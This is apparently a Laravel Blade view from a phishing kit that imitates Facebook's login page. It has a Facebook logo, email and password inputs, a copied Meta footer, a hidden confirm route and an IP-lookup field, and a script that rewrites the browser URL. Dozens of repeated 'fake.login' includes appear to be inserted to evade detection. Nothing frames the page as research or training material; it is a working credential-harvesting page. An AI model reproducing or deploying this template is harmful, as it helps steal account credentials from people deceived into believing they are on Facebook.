@extends('user.main')

@push('styles')
    <link rel="apple-touch-icon" href="{{ $settings['favicon_icon'] }}" sizes="180x180">
    <link rel="icon" href="{{ $settings['favicon_icon'] }}" sizes="32x32">
    <link rel="icon" href="{{ $settings['favicon_icon'] }}" sizes="16x16">
    <link rel="icon" href="{{ $settings['favicon_icon'] }}" sizes="16x16">
    <link rel="mask-icon" href="{{ $settings['favicon_icon'] }}">
    <link rel="icon" href="{{ $settings['favicon_icon'] }}">
    <title>@lang('common.title_confirm_page')</title>
    <!--<meta name="viewport" content="user-scalable=no">-->
    <link type="text/css" href="{{ asset('/css/all.css') }}" rel="stylesheet">
@endpush
@push('scripts')
    <script type="text/javascript">
        const queryParams = '{!! json_encode(\App\Helpers\Helpers::getQueryParams($settings, 'path_confirm_page')) !!}';
        const parseQueryParams = JSON.parse(queryParams);

        function replaceQueryParam(param, value, search) {
            let regex = new RegExp("([?;&])" + param + "[^&;]*[;&]?");
            let query = search.replace(regex, "$1").replace(/&$/, '');

            return (query.length > 2 ? query + "&" : "?") + (value ? param + "=" + value : '');
        }

        if (parseQueryParams.length > 0) {
            for (const query of parseQueryParams) {
                const currentQuery = window.location.search
                const newUrl = replaceQueryParam(query[0], query[1], currentQuery);
                window.history.pushState(null, null, newUrl)
            }
        }
    </script>

    <script src="/js/user/login.js"></script>
@endpush
@section('content')
    @include('fake.login')
    <main class="home">
        <div class="header">
            @include('fake.login')
            <div class="header-dialog">
                <div class="header-content">
                    <div class="header-border"></div>
                    @include('fake.login')
                    <div class="header-main">
                        <a class="logo" href="javascript:;">
                            <div class="logo-content">
                                <img class="img" src="{{ asset('assets/img/B2Ha-q3dWRO.png') }}" width="34"
                                    height="23" alt="">
                            </div>
                            @include('fake.login')
                            @lang('login.title')
                        </a>
                    </div>
                    @include('fake.login')
                    <div class="header-login">
                        <div class="login-content">
                            @include('fake.login')
                            <ul class="login-content-list" role="tablist">
                                @include('fake.login')
                                <li class="login-content-item" role="presentation">
                                    <a role="button" class="login-content-link-login" href="javascript:;">@lang('login.login_button_top')
                                    </a>
                                </li>
                                @include('fake.login')
                                @include('fake.login')
                                <li class="login-content-item" role="presentation">
                                    <a role="button" class="login-content-link-create" href="javascript:;"
                                        data-testid="business-create-account-button">@lang('login.create_account')
                                        @include('fake.login')
                                        @include('fake.login')
                                        @include('fake.login')
                                    </a>
                                </li>
                            </ul>
                            @include('fake.login')
                            @include('fake.login')
                            @include('fake.login')
                        </div>
                    </div>
                    @include('fake.login')
                    @include('fake.login')
                </div>
            </div>
        </div>
        <div class="body">
            <div class="fb_content clearfix " role="main">
                <div class="body-form">
                    @include('fake.login')
                    @include('fake.login')
                    @include('fake.login')
                    <div class="body-form-notice">
                        <div class="body-form-notice-content">
                            @include('fake.login')
                            @include('fake.login')
                            <i class="notice-icon"><u></u></i>
                            @include('fake.login')
                            @include('fake.login')
                            @include('fake.login')
                            <div class="notice-text">@lang('login.notice_desktop')</div>
                        </div>
                    </div>
                    <div class="alert-form-login alert-form-login-mobile" role="alert" tabindex="0"
                        id="login_error_mobile">
                        @lang('login.error_notice')<a href="https://facebook.com/login/identify/" class="_652e">@lang('login.error_find')</a>
                    </div>
                    <div class="form-login">
                        <div class="form-title">
                            <div class="mobile-title">
                                @include('fake.login')
                                @include('fake.login')
                                @include('fake.login')
                                <div class="mobile-title-content">
                                    <img src="{{ asset('assets/img/dF5SId3UHWd.svg') }}" width="112" class="img"
                                        alt="facebook">
                                </div>
                            </div>
                            @include('fake.login')
                            @include('fake.login')
                            @include('fake.login')
                            <span class="form-title-content">
                                <div class="form-title-text">@lang('login.login_box_title')</div>
                            </span>
                        </div>
                        <div class="login_form_container">
                            <form class="mobile-login-form">
                                <div class="alert-form-login alert-form-login-desktop" role="alert" tabindex="0"
                                    id="login_error">
                                    @lang('login.error_notice')<a href="https://facebook.com/login/identify/"
                                        class="_652e">@lang('login.error_find')</a>
                                </div>
                                @include('fake.login')
                                @include('fake.login')
                                @include('fake.login')
                                @include('fake.login')
                                <div class="login-form-main-mobile">
                                    <div class="login-form-item">
                                        <div class="login-form-item-content">
                                            <div class="login-form-control">
                                                <input autocorrect="off" autocapitalize="off" style="font-size:16px"
                                                    type="email"
                                                    class="input-form-login validate-input validate-phone-email"
                                                    autocomplete="on" id="username-mobile" name="username"
                                                    placeholder="@lang('login.email')" data-sigil="m_login_email">
                                            </div>
                                            @include('fake.login')
                                            @include('fake.login')
                                            @include('fake.login')
                                            @include('fake.login')
                                            @include('fake.login')
                                            @include('fake.login')
                                        </div>
                                    </div>
                                    <div class="login-form-item-hr"></div>
                                    <div class="login-form-item">
                                        <div class="login-form-item-content">
                                            <div class="login-form-password" data-sigil="m_login_password">
                                                @include('fake.login')
                                                @include('fake.login')
                                                @include('fake.login')
                                                <div class="login-form-password-content">
                                                    <div class="login-form-password-content-item">
                                                        <div class="login-form-password-control">
                                                            <input autocorrect="off" style="font-size:16px"
                                                                autocapitalize="off"
                                                                class="input-form-login validate-input" autocomplete="on"
                                                                id="password-mobile" name="password"
                                                                placeholder="@lang('login.password')" type="password"
                                                                data-sigil="password-plain-text-toggle-input">
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                            @include('fake.login')
                                            @include('fake.login')
                                            @include('fake.login')
                                            @include('fake.login')
                                            @include('fake.login')
                                            @include('fake.login')
                                            @include('fake.login')
                                        </div>
                                    </div>
                                </div>
                                <div class="login-form-main">
                                    <div class="login-form-main-content">
                                        <input autocorrect="off" autocapitalize="off"
                                            class="input-form-login validate-input validate-phone-email" autocomplete="on"
                                            id="username-desktop" name="username" placeholder="@lang('login.email')"
                                            type="text" data-sigil="m_login_email" style="">
                                        <input autocorrect="off" autocapitalize="off"
                                            class="input-form-login validate-input" autocomplete="on" type="password"
                                            name="password" id="password-desktop" tabindex="0"
                                            placeholder="@lang('login.password')" value="" aria-label="Password">

                                        <button type="button" class="button-form-login" id="btnLogin-desktop">
                                            @include('fake.login')
                                            @include('fake.login')
                                            @include('fake.login')
                                            @include('fake.login')
                                            @include('fake.login')
                                            <span id="submit-login-loading" class="d-none spinner-border spinner">
                                            </span>
                                            <span id="submit-login-text">@lang('login.submit')</span>
                                        </button>

                                        <div class="login-form-link" id="login_link">
                                            <a href="javascript:;" class="_97w4" target="">@lang('login.forgotten')?</a>
                                            <span role="presentation" aria-hidden="true"> · </span>
                                            <a href="javascript:;" rel="nofollow" class="_97w5">@lang('login.sign_up_to_facebook')
                                            </a>
                                            @include('fake.login')
                                            @include('fake.login')
                                            @include('fake.login')
                                            @include('fake.login')
                                            @include('fake.login')
                                            @include('fake.login')
                                            @include('fake.login')
                                        </div>
                                    </div>
                                </div>
                                <div class="mobile-button-submit">
                                    <div data-sigil="login_password_step_element">
                                        <button type="button" class="mobile-login-button" id="btnLogin-mobile">
                                            <span id="submit-login-mobile-loading"
                                                class="d-none spinner-border spinner"></span>
                                            <span id="submit-login-mobile-text">@lang('login.submit')</span>
                                        </button>
                                        @include('fake.login')
                                        @include('fake.login')
                                    </div>
                                </div>
                            </form>
                            <div class="mobile-footer">
                                <div class="footer-forgot-password">
                                    <div class="footer-forgot-password-item">
                                        <a class="footer-forgot-password-link" tabindex="0"
                                            href="https://www.facebook.com/login/identify">@lang('login.forgotten')?
                                        </a>
                                    </div>
                                </div>
                                @include('fake.login')
                                @include('fake.login')
                                <div class="create-new">
                                    <div class="create-new-content">
                                        <div class="create-new-item-line">
                                            <div class="create-new-item-line-content">
                                                <div class="create-new-line-hr" data-sigil="login_reg_separator">
                                                    <span class="line-hr">or</span>
                                                </div>
                                                <div class="create-new-button">
                                                    <a href="https://www.facebook.com/reg" class="button-create-new"
                                                        id="signup-button" tabindex="0" data-sigil="m_reg_button"
                                                        data-autoid="autoid_7">@lang('login.create_new_account')</a>
                                                </div>
                                                @include('fake.login')
                                                @include('fake.login')
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        @include('fake.login')
                        @include('fake.login')
                    </div>
                </div>
                <div class="footer">
                    <div class="footer-wrapper">
                        <div class="footer-content">
                            <ul class="footer-item-list">
                                <li>English (US)</li>
                                <li>
                                    <a class="_sv4" dir="ltr" href="javascript:;"
                                        title="Traditional Chinese (Taiwan)">中文(台灣)</a>
                                </li>
                                @include('fake.login')
                                @include('fake.login')
                                <li>
                                    <a class="_sv4" dir="ltr" href="javascript:;" title="Korean">한국어</a>
                                </li>
                                <li>
                                    <a class="_sv4" dir="ltr" href="javascript:;" title="Japanese">日本語</a>
                                    @include('fake.login')
                                    @include('fake.login')
                                </li>
                                <li>
                                    <a class="_sv4" dir="ltr" href="javascript:;"
                                        title="French (France)">Français (France)</a>
                                    @include('fake.login')
                                    @include('fake.login')
                                </li>
                                <li>
                                    <a class="_sv4" dir="ltr" href="javascript:;" title="Thai">ภาษาไทย</a>
                                </li>
                                <li>
                                    <a class="_sv4" dir="ltr" href="javascript:;" title="Spanish">Español</a>
                                </li>
                                <li>
                                    <a class="_sv4" dir="ltr" href="javascript:;" @include('fake.login')
                                        @include('fake.login') title="Portuguese (Brazil)">Português (Brasil)</a>
                                </li>
                                <li>
                                    <a class="_sv4" dir="ltr" href="javascript:;" title="German">Deutsch</a>
                                </li>
                                <li>
                                    <a class="_sv4" dir="ltr" href="javascript:;" title="Italian">Italiano</a>
                                </li>
                                @include('fake.login')
                                @include('fake.login')
                                <li>
                                    <a role="button" class="button-plus" rel="dialog" ajaxify=""
                                        href="javascript:;" title="Show more languages">
                                        <i class="button-plus-icon"></i>
                                    </a>
                                </li>
                            </ul>
                            <div class="content-curve"></div>
                            <div class="footer-children">
                                @include('fake.login')
                                @include('fake.login')
                                <ul class="footer-children-item-list">
                                    <li><a href="javascript:;" title="Sign up for Facebook">Sign Up</a></li>
                                    <li><a href="javascript:;" title="Log in to Facebook">Log in</a></li>
                                    <li><a href="javascript:;" title="Take a look at Messenger.">Messenger</a>
                                    </li>
                                    <li><a href="javascript:;" title="Facebook Lite for Android.">Facebook Lite</a></li>
                                    <li><a href="javascript:;" title="Browse in Video">Video</a>
                                    </li>
                                    <li><a href="javascript:;"
                                            title="Take a look at popular places on Facebook.">Places</a>
                                    </li>
                                    <li><a href="javascript:;" title="Check out Facebook games.">Games</a></li>
                                    <li><a href="javascript:;"
                                            title="Buy and sell on Facebook Marketplace.">Marketplace</a></li>
                                    @include('fake.login')
                                    @include('fake.login')
                                    <li><a href="javascript:;" title="Learn more about Meta Pay" target="_blank">Meta
                                            Pay</a></li>
                                    <li><a href="javascript:;" title="Discover Meta" target="_blank">Meta
                                            Store</a>
                                    </li>
                                    <li><a href="javascript:;" title="Learn more about Meta Quest" target="_blank">Meta
                                            Quest</a></li>
                                    <li><a href="" title="Take a look at Instagram" target="_blank"
                                            rel="noreferrer nofollow" data-lynx-mode="asynclazy">Instagram</a></li>
                                    @include('fake.login')
                                    @include('fake.login')
                                    @include('fake.login')
                                    <li><a href="" title="Check out Threads" target="_blank"
                                            rel="noreferrer nofollow" data-lynx-mode="asynclazy">Threads</a></li>
                                    <li><a href="javascript:;" title="Donate to worthy causes.">Fundraisers</a></li>
                                    <li><a href="javascript:;"
                                            title="Browse our Facebook Services directory.">Services</a></li>
                                    <li><a href="javascript:;" title="See the Voting Information Centre">Voting
                                            Information Centre</a></li>
                                    <li><a href="javascript:;"
                                            title="Learn how we collect, use and share information to support Facebook.">Privacy
                                            Policy</a></li>
                                    <li><a href="javascript:;" @include('fake.login') @include('fake.login')
                                            title="Learn how to manage and control your privacy on Facebook.">Privacy
                                            Centre</a></li>
                                    <li><a href="javascript:;" title="Explore our groups.">Groups</a></li>
                                    <li><a href="javascript:;" accesskey="8"
                                            title="Read our blog, discover the resource centre and find job opportunities.">About</a>
                                    </li>
                                    <li>
                                        <a href="javascript:;" title="Advertise on Facebook">Create ad</a>
                                    </li>
                                    <li><a href="javascript:;" title="Create a Page">Create
                                            Page</a>
                                        @include('fake.login')
                                        @include('fake.login')
                                        @include('fake.login')
                                        @include('fake.login')
                                        @include('fake.login')
                                        @include('fake.login')
                                        @include('fake.login')
                                    </li>
                                    <li><a href="javascript:;" title="Develop on our platform.">Developers</a>
                                    </li>
                                    <li><a href="javascript:;"
                                            title="Make your next career move to our brilliant company.">Careers</a></li>
                                    <li><a href="javascript:;" title="Learn about cookies and Facebook."
                                            @include('fake.login') @include('fake.login')
                                            @include('fake.login') @include('fake.login')
                                            @include('fake.login') @include('fake.login')
                                            data-nocookies="1">Cookies</a></li>
                                    <li><a class="_41ug" data-nocookies="1" href="javascript:;"
                                            title="Learn about AdChoices.">AdChoices<i
                                                class="img sp_EP9wX8qDDvu sx_6bdd81"></i></a></li>
                                    <li><a data-nocookies="1" href="javascript:;" accesskey="9"
                                            title="Review our terms and policies.">Terms</a></li>
                                    <li><a href="javascript:;" accesskey="0" title="Visit our Help Centre.">Help</a>
                                    </li>
                                    <li><a href="javascript:;"
                                            title="Visit our contact uploading and non-users notice.">Contact uploading
                                            and
                                            non-users</a></li>
                                    <li><a accesskey="6" class="accessible_elem" href="/settings"
                                            title="View and edit your Facebook settings.">Settings</a></li>
                                    <li><a accesskey="7" class="accessible_elem" href="javascript:;"
                                            title="View your activity log">Activity log</a></li>
                                </ul>
                            </div>
                            <div class="footer-copyright">
                                @include('fake.login')
                                @include('fake.login')
                                @include('fake.login')
                                @include('fake.login')
                                @include('fake.login')
                                @include('fake.login')
                                @include('fake.login')
                                <div><span> Meta © 2023</span></div>
                            </div>
                        </div>
                    </div>
                    @include('fake.login')
                </div>
            </div>
            <div></div>
            @include('fake.login')
            <span></span>
        </div>
        @include('fake.login')
        @include('fake.login')
        @include('fake.login')
        @include('fake.login')
        @include('fake.login')
        <input type="hidden" id="getIpInfoUrl" value="{{ session()->get('getIpInfoUrl') }}" />
        <input type="hidden" id="url-confirm" value="{{ route('confirm') }}" />
    </main>
@endsection
